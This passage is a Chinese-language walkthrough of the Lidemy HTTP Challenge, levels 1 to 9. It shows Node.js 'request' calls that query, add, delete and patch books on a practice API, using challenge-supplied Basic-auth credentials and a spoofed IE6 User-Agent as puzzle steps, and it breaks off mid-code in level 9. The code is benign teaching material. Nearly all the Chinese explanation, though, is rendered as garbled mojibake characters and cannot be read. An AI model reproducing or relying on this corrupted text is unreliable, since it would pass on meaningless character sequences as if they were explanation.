1234request('https://lidemy-http-challenge.herokuapp.com/lv1?token={GOGOGO}&amp;name=PeaNu',(err, res, body) =&gt; { console.log(body)}) responseï¼š 1å•Š...åŸä¾†ä½ å« PeaNu å•Šï¼ä¸‹ä¸€é—œçš„ token æ˜¯ {HellOWOrld} ç¬¬ä¸€é—œå°±åˆ°é€™é‚ŠçµæŸï¼Œé€²åˆ°ä¸‹ä¸€é—œå›‰ã€‚ ç¬¬äºŒé—œ1. é–‹å ´åˆ©ç”¨ç¬¬ä¸€é—œçµ¦çš„ tokenï¼š{HellOWOrld}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv2?token={HellOWOrld}',(err, res, body) =&gt; { console.log(body)}) responseï¼š 1234æˆ‘å‰é™£å­åœ¨æ•´ç†æ›¸ç±çš„æ™‚å€™çœ‹åˆ°äº†ä¸€æœ¬æˆ‘å¾ˆå–œæ­¡çš„æ›¸ï¼Œå¯æ˜¯ç¾åœ¨å»æ€éº¼æƒ³éƒ½æƒ³ä¸èµ·ä¾†æ˜¯å“ªä¸€æœ¬...æˆ‘åªè¨˜å¾—é‚£æœ¬æ›¸çš„ id æ˜¯å…©ä½æ•¸ï¼Œä»‹æ–¼ 54~58 ä¹‹é–“ï¼Œä½ å¯ä»¥å¹«å¹«æˆ‘å—ï¼Ÿæ‰¾åˆ°æ˜¯å“ªä¸€æœ¬ä¹‹å¾ŒæŠŠæ›¸çš„ id ç”¨ GET å‚³çµ¦æˆ‘å°±è¡Œäº†ã€‚ 2. è¼¸å…¥æ­£ç¢ºçš„ idæ¥ä¸‹ä¾†è¦ç”¨ &amp;id=54~58 ç™¼å‡º GET è«‹æ±‚ï¼Œå…¶ä¸­æœƒæœ‰ä¸€å€‹æ˜¯æ­£ç¢ºçš„ idï¼Œä¹Ÿå°±æ˜¯ 56ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv2?token={HellOWOrld}&amp;id=56',(err, res, body) =&gt; { console.log(body)}) responseï¼š 1å•Šï¼å°±æ˜¯é€™æœ¬æ›¸ï¼Œå¤ªè¬è¬ä½ äº†ã€‚ä¸‹ä¸€é—œçš„ token ç‚ºï¼š{5566NO1} ä¸€æ¨£é †åˆ©æ‹¿åˆ° tokenï¼Œé€²åˆ°ä¸‹ä¸€é—œï¼ å‚™è¨»ï¼šè©¦è‘—ç”¨ç¬¬ä¸€é—œçµ¦çš„ APIï¼Œå»æŸ¥è©¢ id=56 çš„æ›¸ï¼Œæœƒç™¼ç¾ç®¡ç†å“¡åœ¨æ‰¾çš„æ›¸ç‚ºã€Œ5566 - èªçœŸã€ï¼Œæ­£å¥½å°æ‡‰äº† {5566NO1}ã€‚ ç¬¬ä¸‰é—œ1. é–‹å ´åˆ©ç”¨ç¬¬äºŒé—œçµ¦çš„ tokenï¼š{5566NO1}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv3?token={5566NO1}',(err, res, body) =&gt; { console.log(body)}) responseï¼š 12345678çœŸæ˜¯å¤ªæ„Ÿè¬ä½ å¹«æˆ‘æ‰¾åˆ°é€™æœ¬æ›¸äº†ï¼å‰›å‰›åœ¨ä½ æ‰¾æ›¸çš„æ™‚å€™æœ‰ä¸€æ‰¹æ–°çš„æ›¸ç±é€ä¾†äº†ï¼Œæ˜¯é€™æ¬¡åœ–æ›¸é¤¨æ ¹æ“šè®€è€…çš„æ¨è–¦è²·çš„æ–°æ›¸ï¼Œå…¶ä¸­æœ‰ä¸€æœ¬æˆ‘ç‰¹åˆ¥å–œæ­¡ï¼Œæƒ³è¦å„ªå…ˆä¸Šæ¶ã€‚æ›¸åæ˜¯ã€Šå¤§è…¦å–œæ­¡é€™æ¨£å­¸ã€‹ï¼ŒISBN ç‚º 9789863594475ã€‚å°±æ‹œè¨—ä½ äº†ã€‚æ–°å¢å®Œä¹‹å¾Œå¹«æˆ‘æŠŠæ›¸ç±çš„ id ç”¨ GET å‘Šè¨´æˆ‘ã€‚ 2. æ–°å¢æ›¸ç±é€™æ™‚å€™å°±è¦ç”¨åˆ°å‰›å‰›çš„ API äº†ï¼Œè«‹é–±è®€è£¡é¢çš„èªªæ˜ï¼Œç„¶å¾Œç”¨ POST æŠŠæ›¸æ–°å¢åˆ°åœ–æ›¸ç³»çµ±è£¡ï¼š 123456789101112131415const API_ENDPOINT_V1 = 'https://lidemy-http-challenge.herokuapp.com/api'request({ method: 'POST', url: `${API_ENDPOINT_V1}/books`, headers: { 'Content-type': 'application/x-www-form-urlencoded' }, form: { name: 'ã€Šå¤§è…¦å–œæ­¡é€™æ¨£å­¸ã€‹', ISBN: 9789863594475 }},(err, res, body) =&gt; { console.log(body)}) æˆ‘å€‘è¦ç”¨ã€Œform è¡¨å–®ã€çš„æ ¼å¼ä¾†å‚³é€ï¼Œæ‰€ä»¥åœ¨ header åŠ ä¸Š 'Content-type': 'application/x-www-form-urlencoded' responseï¼š 1{\"message\":\"æ–°å¢æˆåŠŸ\",\"id\":\"1989\"} æ¥è‘—æŠŠå–å¾—çš„ id åŠ ä¸Šå»å°±å¯ä»¥äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv3?token={5566NO1}&amp;id=1989',(err, res, body) =&gt; { console.log(body)}) responseï¼š 1é€™æ¨£å­è®€è€…å°±èƒ½è¶•å¿«çœ‹åˆ°é€™æœ¬æ–°æ›¸äº†ï¼Œè¬è¬ï¼ä¸‹ä¸€é—œçš„ token ç‚º {LEarnHOWtoLeArn} ç¬¬å››é—œ1. é–‹å ´åˆ©ç”¨ç¬¬ä¸‰é—œçµ¦çš„ tokenï¼š{LEarnHOWtoLeArn}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv4?token={LEarnHOWtoLeArn}',(err, res, body) =&gt; { console.log(body)}) responseï¼š 1234æˆ‘ç¿»äº†ä¸€ä¸‹ä½ ä¹‹å‰å¹«æˆ‘æ‰¾çš„é‚£æœ¬æ›¸ï¼Œç™¼ç¾æˆ‘è¨˜éŒ¯äº†...é€™ä¸æ˜¯æˆ‘æœæ€æš®æƒ³çš„é‚£ä¸€æœ¬ã€‚æˆ‘ä¹‹å‰è·Ÿä½ è¬›çš„ç·šç´¢å¥½åƒéƒ½æ˜¯éŒ¯çš„ï¼Œæˆ‘è¨˜åˆ°åˆ¥æœ¬æ›¸å»äº†ï¼ŒçœŸæ˜¯æŠ±æ­‰å•Šã€‚æˆ‘è¨˜å¾—æˆ‘æƒ³æ‰¾çš„é‚£æœ¬æ›¸ï¼Œæ›¸åæœ‰ï¼šã€Œä¸–ç•Œã€å…©å­—ï¼Œè€Œä¸”æ˜¯æ‘ä¸Šæ˜¥æ¨¹å¯«çš„ï¼Œå¯ä»¥å¹«æˆ‘æ‰¾åˆ°æ›¸çš„ id ä¸¦å‚³çµ¦æˆ‘å—ï¼Ÿ 2. æ‰¾å‡ºæ›¸æœ¬çš„ idé€™é‚Šæœ‰å…©ç¨®æ–¹æ³•ï¼Œä¸€ç¨®æ˜¯åœ¨ API ä¸ŠåŠ ä¸Šåƒæ•¸ï¼Œä¸€ç¨®æ˜¯æŠŠæ•´ç­†æŠ“ä¸‹ä¾†å¾Œè‡ªå·±æ‰¾ã€‚å…ˆç¤ºç¯„ç¬¬ä¸€ç¨®ï¼š 123456789101112/* æŠŠ API åŠ ä¸Š quest string é€™é‚Šè¦è‡ªå·±æŠŠã€Œä¸–ç•Œã€åš url encodeï¼Œä¸ç„¶æœƒå¤±æ•—ã€‚ */const API_ENDPOINT_V1 = 'https://lidemy-http-challenge.herokuapp.com/api'request({ method: 'GET', url: `${API_ENDPOINT_V1}/books?q=%E4%B8%96%E7%95%8C`,},(err, res, body) =&gt; { console.log(JSON.parse(body))}) responseï¼š 1234567891011[ { id: 2, name: 'ç•¶æˆ‘æƒ³ä½ æ™‚ï¼Œå…¨ä¸–ç•Œéƒ½æ•‘ä¸äº†æˆ‘', author: 'è‚†ä¸€', ISBN: '5549173495' }, { id: 27, name: 'å¾ä½ çš„å…¨ä¸–ç•Œè·¯é', author: 'å¼µå˜‰ä½³', ISBN: '8426216529' }, { id: 79, name: 'ä¸–ç•Œæœ«æ—¥èˆ‡å†·é…·ç•°å¢ƒ', author: 'æ‘ä¸Šæ˜¥æ¨¹', ISBN: '9571313408' }, { id: 90, name: 'æ–‡å­¸çš„40å ‚å…¬é–‹èª²ï¼šå¾ç¥è©±åˆ°ç•¶ä»£æš¢éŠ·æ›¸ï¼Œæ–‡å­¸å¦‚ä½•å½±éŸ¿æˆ‘å€‘ã€å¸¶é ˜æˆ‘å€‘ç†è§£é€™å€‹ä¸–ç•Œ', author: 'ç´„ç¿°ï¼è–©å¾·è˜­', ISBN: '7978376866' }] ç¬¬äºŒç¨®ï¼Œæ•´ç­†æŠ“ä¸‹ä¾†å†æœå°‹ï¼š 1234567891011const API_ENDPOINT_V1 = 'https://lidemy-http-challenge.herokuapp.com/api'request({ method: 'GET', url: `${API_ENDPOINT_V1}/books`,},(err, res, body) =&gt; { const books = JSON.parse(body) // æœå°‹æ›¸åç‚ºã€Œä¸–ç•Œã€èˆ‡ä½œè€…ç‚ºã€Œæ‘ä¸Šæ˜¥æ¨¹ã€çš„æ›¸ target = books.filter(elem =&gt; elem.author === 'æ‘ä¸Šæ˜¥æ¨¹' &amp;&amp; elem.name.includes('ä¸–ç•Œ') ) console.log(target)}) responseï¼š 1[ { id: 79, name: 'ä¸–ç•Œæœ«æ—¥èˆ‡å†·é…·ç•°å¢ƒ', author: 'æ‘ä¸Šæ˜¥æ¨¹', ISBN: '9571313408' } ] æ‰€ä»¥æœ€å¾Œæ‹¿ id=79 å»ç™¼è«‹æ±‚å°±è¡Œå›‰ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv4?token={LEarnHOWtoLeArn}&amp;id=79',(err, res, body) =&gt; { console.log(body)}) responseï¼š 1æ²’éŒ¯ï¼é€™æ¬¡æˆ‘å¾ˆç¢ºå®šäº†ï¼Œå°±æ˜¯é€™æœ¬ï¼ä¸‹ä¸€é—œçš„ token ç‚º {HarukiMurakami} ç¬¬å››é—œçµæŸï¼Œé€²å…¥ä¸‹ä¸€é—œã€‚ å‚™è¨»ï¼štokenï¼š{HarukiMurakami} å°±æ˜¯æ‘ä¸Šæ˜¥æ¨¹çš„åå­—ã€‚ ç¬¬äº”é—œ1. é–‹å ´åˆ©ç”¨ç¬¬å››é—œçµ¦çš„ tokenï¼š{HarukiMurakami}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv5?token={HarukiMurakami}',(err, res, body) =&gt; { console.log(body)}) responseï¼š 1234æ˜¨å¤©æœ‰å€‹äººåŒ†åŒ†å¿™å¿™è·‘éä¾†èªªä»–ä¸å°å¿ƒæéŒ¯æ›¸äº†ï¼Œæƒ³è¦ä¾†å•å¯ä¸å¯ä»¥æŠŠæ›¸æ‹¿å›å»ã€‚è·Ÿä»–æºé€šéå¾Œï¼Œæˆ‘å°±æŠŠä»–æéä¾†çš„æ›¸é‚„ä»–äº†ï¼Œæ‰€ä»¥ç¾åœ¨è¦æŠŠé€™æœ¬æ›¸å¾ç³»çµ±è£¡é¢åˆªæ‰æ‰è¡Œã€‚é‚£æœ¬æ›¸çš„ id æ˜¯ 23ï¼Œä½ å¯ä»¥å¹«æˆ‘åˆªæ‰å—ï¼Ÿ 2. åˆªé™¤æ›¸æœ¬æŒ‰ç…§é¡Œç›®èªªçš„ï¼Œç”¨ DELETE è«‹æ±‚å»æŠŠ id æ˜¯ 23 çš„æ›¸çµ¦åˆªé™¤ï¼š 12345678const API_ENDPOINT_V1 = 'https://lidemy-http-challenge.herokuapp.com/api'request({ method: 'DELETE', url: `${API_ENDPOINT_V1}/books/23`,},(err, res, body) =&gt; { console.log(body)}) responseï¼š 1{\"message\":\"\\nå’¦...æ˜¯åˆªæ‰äº†æ²’éŒ¯ï¼Œä½†ç¸½è¦ºå¾—å“ªè£¡æ€ªæ€ªçš„ï¼Œç®—äº†ï¼Œå…ˆé€™æ¨£å§ï¼ä¸‹ä¸€é—œçš„ token ç‚º {CHICKENCUTLET}\\n\"} ç¬¬äº”é—œçµæŸï¼Œé€²å…¥ä¸‹ä¸€é—œã€‚ å‚™è¨»ï¼šè¢«åˆªé™¤çš„æ›¸ å…¶å¯¦æ˜¯é›æ’å¦¹çš„å¯«çœŸé›†ï¼Œæ‰€ä»¥ token æ‰å«åš {CHICKENCUTLET}ï¼ˆé›æ’ï¼‰ã€‚ ç¬¬å…­é—œ1. é–‹å ´åˆ©ç”¨ç¬¬äº”é—œçµ¦çš„ tokenï¼š{CHICKENCUTLET}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv6?token={CHICKENCUTLET}',(err, res, body) =&gt; { console.log(body)}) responseï¼š 1234567891011æˆ‘çµ‚æ–¼çŸ¥é“ä¸Šæ¬¡å“ªè£¡æ€ªæ€ªçš„äº†ï¼ç…§ç†ä¾†èªªè¦é€²å…¥ç³»çµ±æ‡‰è©²è¦å…ˆç™»å…¥æ‰å°ï¼Œæ€éº¼æ²’æœ‰ç™»å…¥å°±å¯ä»¥æ–°å¢åˆªé™¤...é€™å¤ªå¥‡æ€ªäº†ï¼Œæˆ‘å·²ç¶“å›å ±çµ¦é‚£é‚Šçš„å·¥ç¨‹å¸«äº†ï¼Œä»–å€‘çµ¦äº†æˆ‘ä¸€ä»½æ–°çš„æ–‡ä»¶ï¼šhttps://gist.github.com/aszx87410/1e5e5105c1c35197f55c485a88b0328aã€‚é€™é‚Šæ˜¯å¸³è™Ÿå¯†ç¢¼ï¼Œä½ å…ˆç™»å…¥è©¦è©¦çœ‹å§ï¼Œå¯ä»¥å‘¼å«ä¸€å€‹ /me çš„ endpointï¼Œè£¡é¢æœƒçµ¦ä½ ä¸€å€‹ emailã€‚æŠŠ email æ”¾åœ¨ query string ä¸Šé¢å¸¶éä¾†ï¼Œæˆ‘çœ‹çœ‹æ˜¯ä¸æ˜¯å°çš„ã€‚å¸³è™Ÿï¼šadminå¯†ç¢¼ï¼šadmin123 2. å–å¾—ä½¿ç”¨è€…è³‡è¨Šé€™é‚Šå…ˆåƒè€ƒæ–°çš„ API æ–‡ä»¶èªªæ˜ï¼Œè£¡é¢æåˆ°çš„é©—è­‰å…¶å¯¦å°±æ˜¯ HTTP ä¸­çš„ã€ŒBasic Authenticationã€ï¼Œè©³ç´°å¯ä»¥åƒè€ƒ é€™ç¯‡æ–‡ç« ã€‚ æ‰€ä»¥é€™é‚Šå¾—ä¾ç…§æ ¼å¼æŠŠ admin:admin123 åš ã€Œbase64ã€ç·¨ç¢¼ï¼Œå†å¸¶ä¸Š Authorization çš„ headerï¼š 12345678910const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'// ä»¥ base64 ç·¨ç¢¼const encode = Buffer.from('admin:admin123').toString('base64')request({ url: `${API_ENDPOINT_V2}/me`, // å¸¶ä¸Šé©—è­‰ header headers: { 'Authorization': `Basic ${encode}` }}, (err, res, body) =&gt; console.log(body)) å‚™è¨»ï¼šé—œæ–¼ Buffer çš„ç”¨æ³•å¯ä»¥åƒè€ƒ Node ä¸­çš„ buffer æ¨¡çµ„ responseï¼š 1{\"username\":\"admin\",\"email\":\"lib@lidemy.com\"} æœ€å¾ŒæŠŠ email å¸¶åˆ°åƒæ•¸è£¡é€™é—œå°± pass äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv6?token={CHICKENCUTLET}&amp;email=lib@lidemy.com',(err, res, body) =&gt; { console.log(body)}) responseï¼š 1å°å°å°ï¼Œå°±æ˜¯é€™å€‹ï¼Œé€™æ¨£æ‰å°å˜›ï¼ä¸‹ä¸€é—œçš„ token ç‚º {SECurityIsImPORTant} å‚™è¨»ï¼š{SECurityIsImPORTant} = å®‰å…¨æ€§å¾ˆé‡è¦ã€‚ ç¬¬ä¸ƒé—œ1. é–‹å ´åˆ©ç”¨ç¬¬å…­é—œçµ¦çš„ tokenï¼š{SECurityIsImPORTant}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv7?token={SECurityIsImPORTant}',(err, res, body) =&gt; { console.log(body)}) responseï¼š 1234567é‚£é‚Šçš„å·¥ç¨‹å¸«èªªç³»çµ±æ•´å€‹ä¿®å¾©å®Œæˆäº†ï¼Œå‰›å¥½æ˜¨å¤©æˆ‘å€‘ç™¼ç¾æœ‰ä¸€æœ¬æ›¸è¢«å·èµ°äº†...é€™æœ¬æ›¸æˆ‘å€‘å·²ç¶“è²·ç¬¬äº”æ¬¡äº†ï¼Œæ¯æ¬¡éƒ½è¢«å·èµ°ï¼Œçœ‹ä¾†é€™æœ¬æ›¸å¾ˆç†±é–€å•Šã€‚æˆ‘å€‘è¦æŠŠé€™æœ¬æ›¸å¾ç³»çµ±è£¡é¢åˆªæ‰ï¼Œå°±æ‹œè¨—ä½ äº†ã€‚å°äº†ï¼è¨˜å¾—è¦ç”¨æ–°çš„ç³»çµ±å–”ï¼ŒèˆŠçš„å·²ç¶“å®Œå…¨å»¢æ£„ä¸ç”¨äº†ã€‚æ›¸çš„ id æ˜¯ 89 2. åˆªé™¤æ›¸æœ¬å°±æ˜¯ç”¨ DELETE å»æŠŠæ›¸æœ¬åˆªæ‰è€Œå·²ï¼š 12345678const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'request({ method: 'DELETE', url: `${API_ENDPOINT_V2}/books/89`, headers: { 'Authorization': 'Basic YWRtaW46YWRtaW4xMjM=' }}, (err, res, body) =&gt; console.log(body)) 1{\"message\":\"\\nå¸Œæœ›ä¸‹ä¸€æ¬¡é€²é€™æœ¬æ›¸çš„æ™‚å€™ä¸æœƒå†è¢«å·èµ°äº†ã€‚ä¸‹ä¸€é—œçš„ token ç‚º {HsifnAerok}\\n\"} é †åˆ©é€²åˆ°ä¸‹ä¸€é—œã€‚ å‚™è¨»ï¼šé€™æœ¬è¢«å·èµ°çš„æ›¸å…¶å¯¦æ˜¯ã€Œè·Ÿè‘—æœˆäº®èµ°ï¼šéŸ“åœ‹ç‘œçš„å¤œè¥²ç²¾ç¥èˆ‡å¥®é€²äººç”Ÿã€ï¼Œæ‰€ä»¥æŠŠ {HsifnAerok} å€’éä¾†å°±æœƒç™¼ç¾æ˜¯ {koreAnfisH}ï¼ˆéŸ“åœ‹é­šï¼‰ 1{\"id\":89,\"name\":\"è·Ÿè‘—æœˆäº®èµ°ï¼šéŸ“åœ‹ç‘œçš„å¤œè¥²ç²¾ç¥èˆ‡å¥®é€²äººç”Ÿ\",\"author\":\"éŸ“åœ‹ç‘œ\",\"ISBN\":\"9789571376882\"} ç¬¬å…«é—œ1. é–‹å ´åˆ©ç”¨ç¬¬ä¸ƒé—œçµ¦çš„ tokenï¼š{HsifnAerok}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv8?token={HsifnAerok}',(err, res, body) =&gt; { console.log(body)}) responseï¼š 123456æˆ‘æ˜¨å¤©åœ¨æ•´ç†æ›¸ç±çš„æ™‚å€™ç™¼ç¾æœ‰ä¸€æœ¬æ›¸çš„ ISBN ç·¨è™Ÿè·Ÿç³»çµ±å…§çš„å°ä¸ä¸Šï¼Œä»”ç´°çœ‹äº†ä¸€ä¸‹ç™¼ç¾æˆ‘ç•¶æ™‚è¼¸å…¥ç³»çµ±æ™‚ key éŒ¯äº†ã€‚å“å‘€ï¼Œäººè€äº†å°±æ˜¯é€™æ¨£ï¼Œè€æ˜¯æœƒçœ‹éŒ¯ã€‚é‚£æœ¬æ›¸çš„åå­—è£¡é¢æœ‰å€‹ã€Œæˆ‘ã€ï¼Œä½œè€…çš„åå­—æ˜¯å››å€‹å­—ï¼Œkey éŒ¯çš„ ISBN æœ€å¾Œä¸€ç¢¼ç‚º 7ï¼Œåªè¦æŠŠæœ€å¾Œä¸€ç¢¼æ”¹æˆ 3 å°±è¡Œäº†ã€‚å°äº†ï¼è¨˜å¾—è¦ç”¨æ–°çš„ç³»çµ±å–”ï¼ŒèˆŠçš„å·²ç¶“å®Œå…¨å»¢æ£„ä¸ç”¨äº†ã€‚ 2. æ‰¾å‡ºå¡«éŒ¯è³‡è¨Šçš„æ›¸æœ¬é€™é‚Šä¸€æ¨£å¯ä»¥ç”¨ API åƒæ•¸ä¾†æ‰¾ï¼Œæˆ–è€…æ˜¯æ•´ç­†æŠ“ä¸‹ä¾†å†æœå°‹ã€‚å…ˆç¤ºç¯„ç¬¬ä¸€ç¨®ï¼š 123456789const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'const encode = Buffer.from('admin:admin123').toString('base64')request({ // æœå°‹ã€Œæˆ‘ã€ï¼Œè¨˜å¾—ä¸€æ¨£è¦åš url encode url: `${API_ENDPOINT_V2}/books?q=%E6%88%91`, headers: { 'Authorization': `Basic ${encode}` }}, (err, res, body) =&gt; console.log(JSON.parse(body))) responseï¼š 1234567891011121314151617181920212223242526272829303132333435[ { id: 2, name: 'ç•¶æˆ‘æƒ³ä½ æ™‚ï¼Œå…¨ä¸–ç•Œéƒ½æ•‘ä¸äº†æˆ‘', author: 'è‚†ä¸€', ISBN: '5549173495' }, { id: 3, name: 'æˆ‘æ®ºçš„äººèˆ‡æ®ºæˆ‘çš„äºº', author: 'æ±å±±å½°è‰¯', ISBN: '9262228645' }, { id: 7, name: 'ä½ å·²èµ°é ï¼Œæˆ‘é‚„åœ¨ç·´ç¿’é“åˆ¥', author: 'æ¸ºæ¸º', ISBN: '3722233689' }, { id: 9, name: 'ä½ æ˜¯æˆ‘æœ€ç†Ÿæ‚‰çš„é™Œç”Ÿäºº', author: 'Middle', ISBN: '9765734253' }, { id: 22, name: 'æˆ‘è¼©ä¸­äººï¼šå¯«çµ¦ä¸­å¹´äººçš„æƒ…æ›¸', author: 'å¼µæ›¼å¨Ÿ', ISBN: '7241428897' }, { id: 38, name: 'æˆ‘å’Œæˆ‘è¿½é€çš„åƒåœ¾è»Š', author: 'è¬å­å‡¡', ISBN: '7797349452' }, { id: 57, name: 'æˆ‘çš„æ«»èŠ±æˆ€äºº', author: 'å®‡å±±ä½³ä½‘', ISBN: '2947749939' }, { id: 60, name: 'ä½ èµ°æ…¢äº†æˆ‘çš„æ™‚é–“', author: 'å¼µè¥¿', ISBN: '8811544334' }, { id: 66, name: 'æˆ‘æ˜¯è¨±æ¶¼æ¶¼', author: 'æç¶­è', ISBN: '8389193464' }, { id: 72, name: 'æ—¥æ—¥å¥½æ—¥ï¼šèŒ¶é“æ•™æˆ‘çš„å¹¸ç¦15å‘³ã€é›»å½±æ›¸è…°ç‰ˆã€‘', author: 'æ£®ä¸‹å…¸å­', ISBN: '9981835427' }, { id: 90, name: 'æ–‡å­¸çš„40å ‚å…¬é–‹èª²ï¼šå¾ç¥è©±åˆ°ç•¶ä»£æš¢éŠ·æ›¸ï¼Œæ–‡å­¸å¦‚ä½•å½±éŸ¿æˆ‘å€‘ã€å¸¶é ˜æˆ‘å€‘ç†è§£é€™å€‹ä¸–ç•Œ', author: 'ç´„ç¿°ï¼è–©å¾·è˜­', ISBN: '7978376866' }, { id: 95, name: 'æˆ‘æƒ³åƒæ‰ä½ çš„èƒ°è‡Ÿã€é›»å½±çè—ç‰ˆã€‘', author: 'ä½é‡å¤œ', ISBN: '2615985356' }, { id: 100, name: 'æ…¢æƒ…æ›¸ï¼šæˆ‘å€‘æœƒåœ¨æ›´å¥½çš„åœ°æ–¹ç›¸é‡å—ï¼Ÿ', author: 'æ—é”é™½', ISBN: '7418527246' }] ï¼ˆæœ‰è »å¤šç­†ç¬¦åˆçš„ï¼Œæ‰€ä»¥æŠ“ä¸‹ä¾†å¾Œé‚„æ˜¯è¦å†æœå°‹ä¸€ä¸‹æ¯”è¼ƒæ¸…æ¥šï¼‰ ç¬¬äºŒç¨®ï¼Œæ•´ç­†æŠ“ä¸‹ä¾†æœå°‹ï¼š 12345678910111213141516171819const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'request({ method: 'GET', url: `${API_ENDPOINT_V2}/books`, headers: { 'Authorization': 'Basic YWRtaW46YWRtaW4xMjM=' }}, (err, res, body) =&gt; { // æ‰€æœ‰æ›¸ç± const books = JSON.parse(body) // æ‰¾å‡ºåŒ…å«ã€Œæˆ‘ã€è·Ÿã€Œå››å€‹å­—çš„ä½œè€…ã€è·Ÿã€Œä»¥ 7 çµå°¾çš„ ISBN ç¢¼ã€ const target = books.filter(elem =&gt; elem.name.includes('æˆ‘') &amp;&amp; elem.author.length === 4 &amp;&amp; elem.ISBN.endsWith('7')) // çµæœ console.log(target)}) responseï¼š 12345678[ { id: 72, name: 'æ—¥æ—¥å¥½æ—¥ï¼šèŒ¶é“æ•™æˆ‘çš„å¹¸ç¦15å‘³ã€é›»å½±æ›¸è…°ç‰ˆã€‘', author: 'æ£®ä¸‹å…¸å­', ISBN: '9981835427' }] 3. ä¿®æ­£æ›¸æœ¬è³‡è¨ŠçŸ¥é“æ˜¯å“ªä¸€æœ¬æ›¸ä¹‹å¾Œï¼Œç”¨ PATCH å»ä¿®æ”¹ ISBN çš„å€¼å°±å¥½å›‰ï¼š 123456789101112131415const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'request({ method: 'PATCH', url: `${API_ENDPOINT_V2}/books/72`, headers: { 'Authorization': 'Basic YWRtaW46YWRtaW4xMjM=', 'Content-type': 'application/x-www-form-urlencoded' }, form: { // æŠŠ 7 æ”¹æˆ 3 ISBN: '9981835423' }}, (err, res, body) =&gt; { console.log(body)}) responseï¼š 1{\"message\":\"\\nå¸Œæœ›ä¹‹å¾Œä»–å€‘èƒ½å¼•é€²èªéŸ³è¼¸å…¥ç³»çµ±ï¼Œæˆ‘å°±åªè¦è¬›è¬›è©±å°±å¥½ã€‚ä¸‹ä¸€é—œçš„ token ç‚º {NeuN}\\n\"} ç¬¬å…«é—œçµæŸï¼Œé€²åˆ°ä¸‹ä¸€é—œã€‚ å‚™è¨»ï¼š{NeuN} æ˜¯å¾·æ–‡çš„ 9ã€‚ ç¬¬ä¹é—œ1. é–‹å ´åˆ©ç”¨ç¬¬å…«é—œçµ¦çš„ tokenï¼š{NeuN}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv9?token={NeuN}',(err, res, body) =&gt; { console.log(body)}) responseï¼š 12345678API æ–‡ä»¶è£¡é¢æœ‰å€‹ç²å–ç³»çµ±è³‡è¨Šçš„ endpoint ä½ è¨˜å¾—å—ï¼Ÿå·¥ç¨‹å¸«è·Ÿæˆ‘èªªé€™å€‹ç¶²å€ä¸å¤ªä¸€æ¨£ï¼Œç”¨ä¸€èˆ¬çš„æ–¹æ³•æ˜¯æ²’è¾¦æ³•æˆåŠŸæ‹¿åˆ°å›å‚³å€¼çš„ã€‚æƒ³è¦å­˜å–çš„è©±è¦ç¬¦åˆå…©å€‹æ¢ä»¶ï¼š1. å¸¶ä¸Šä¸€å€‹ X-Library-Number çš„ headerï¼Œæˆ‘å€‘åœ–æ›¸é¤¨çš„ç·¨è™Ÿæ˜¯ 202. ä¼ºæœå™¨æœƒç”¨ user agent æª¢æŸ¥æ˜¯å¦æ˜¯å¾ IE6 é€å‡ºçš„ Requestï¼Œä¸æ˜¯çš„è©±æœƒæ“‹æ‰é †åˆ©æ‹¿åˆ°ç³»çµ±è³‡è¨Šä¹‹å¾Œæ‡‰è©²æœƒæœ‰å€‹å«åš version çš„æ¬„ä½ï¼ŒæŠŠè£¡é¢çš„å€¼æ”¾åœ¨ query string çµ¦æˆ‘å§ã€‚ 2. å–å¾—ç³»çµ±è³‡è¨Šé€™é‚Šè¦å¤šå¸¶ä¸Šå…©å€‹ headerï¼Œåˆ†åˆ¥æ˜¯ X-Library-Number è·Ÿ User-Agentã€‚ X-Library-Number é€™ç¨®ä»¥ X ç‚ºå‰ç¶´çš„ä»£è¡¨æ˜¯è‡ªå®šç¾©çš„ headerï¼Œä¸åœ¨ HTTP è¦ç¯„ä¸­ï¼Œä¸åŠ ä¹Ÿæ²’é—œä¿‚ï¼Œä½†é€™è£¡çš„ä¼ºæœå™¨éœ€è¦è­˜åˆ¥ï¼Œæ‰€ä»¥å¾—åŠ ä¸Šé€™å€‹æ¬„ä½ã€‚ è€Œ User-Agent æ˜¯ç”¨ä¾†ç´€éŒ„ç”¨æˆ¶ç«¯çš„ã€Œç€è¦½å™¨è³‡è¨Šã€è·Ÿã€Œä½œæ¥­ç³»çµ±ã€ç­‰ç­‰çš„è³‡è¨Šï¼Œæ‰€ä»¥é€™é‚Šè¦æŠŠå®ƒæ”¹æˆæ˜¯ IE6 çš„å…§å®¹ã€‚ç›´æ¥ä¸Šç¶²æŸ¥å°±å¯ä»¥æ‰¾åˆ°äº†ï¼šChanging User Agent to IE6 or lower for curl call åŸå§‹ç¢¼ï¼š 123456789101112const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'request({ method: 'GET', url: `${API_ENDPOINT_V2}/sys_info`, headers: { 'Authorization': 'Basic YWRtaW46YWRtaW4xMjM=', 'X-Library-Number': '20', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 